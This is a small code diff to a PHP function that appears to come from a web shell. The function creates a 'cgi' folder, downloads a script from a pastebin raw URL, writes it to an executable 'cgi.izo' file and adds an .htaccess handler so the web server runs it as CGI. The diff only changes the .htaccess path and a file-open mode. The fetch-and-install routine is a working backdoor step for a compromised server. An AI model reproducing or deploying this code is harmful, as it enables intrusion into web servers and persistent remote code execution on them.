@@ -637,9 +637,9 @@ function cgi() {
 	$cgi_dir = mkdir('cgi', 0755);
 	$file_cgi = "cgi/cgi.izo";
 	$isi_htcgi = "AddHandler cgi-script .izo";
-	$htcgi = fopen(".htaccess", "w+");
+	$htcgi = fopen("cgi/.htaccess", "w+");
 	$cgi_script = file_get_contents("https://pastebin.com/raw/MUD0EPjb");
-	$cgi = fopen($file_cgi, "w");
+	$cgi = fopen($file_cgi, "w+");
 	fwrite($cgi, $cgi_script);
 	fwrite($htcgi, $isi_htcgi);
 	chmod($file_cgi, 0755);
